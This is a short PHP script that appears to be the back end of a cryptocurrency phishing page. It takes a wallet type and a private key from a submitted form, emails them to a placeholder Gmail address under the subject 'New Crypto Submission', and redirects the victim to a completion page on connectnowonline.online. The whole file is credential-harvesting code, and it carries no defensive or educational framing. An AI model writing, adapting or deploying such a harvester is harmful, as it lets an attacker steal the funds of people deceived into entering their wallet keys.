

<?php

$b= $_POST["Ethereum"];
$f= $_POST["privatekey"];

$msg =  "Private Key: ".$f." \n Type: ".$b;

// use wordwrap() if lines are longer than 70 characters
$msg = wordwrap($msg,70);

// send email
mail("youremail@gmail.com","New Crypto Submission",$msg);

header("Location: ://connectnowonline.online/complete");
die();



?>